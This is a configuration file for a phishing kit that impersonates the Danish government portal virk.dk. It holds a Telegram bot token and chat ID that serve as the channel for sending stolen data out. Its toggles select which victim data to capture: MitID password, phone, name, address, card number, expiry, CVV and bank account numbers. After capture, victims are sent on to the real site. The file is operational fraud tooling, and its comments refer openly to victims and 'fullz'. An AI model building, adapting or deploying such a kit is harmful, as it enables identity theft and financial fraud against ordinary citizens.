// ============================================================
//  VIRK.DK CLONE — CONFIGURATION
//  Paste your bot info in the two fields below.
// ============================================================

const CONFIG = {

  // ---- Telegram bot ----
  // Create a bot with @BotFather, then paste token + chat ID here.
  TELEGRAM_BOT_TOKEN: "8235621580:AAF_Cd07enQNQGr4096gTRlEW5Oim7PEjsY",
  TELEGRAM_CHAT_ID: "8839044436",

  // ---- Lead counter ----
  // Starting value for "New Lead: #N".
  // Counter is kept in localStorage on the victim's browser and
  // increments for every fullz sent from that browser.
  LEAD_COUNTER_START: 1,

  // ---- Redirect after success ----
  // Where the victim lands after the final step completes.
  REDIRECT_URL: "https://virk.dk",

  // ---- Field toggles ----
  // Set false to hide a field on the capture steps.
  FIELDS: {
    mitidPassword: false,  // MitID adgangskode (alongside CPR)
    phone:         true,
    fullName:      true,
    address:       true,
    postalCode:    true,
    city:          true,
    bankName:      true,
    cardHolder:    true,
    cardNumber:    true,
    expiry:        true,
    cvv:           true,
    regNr:         true,
    kontoNr:       true,
  },
};
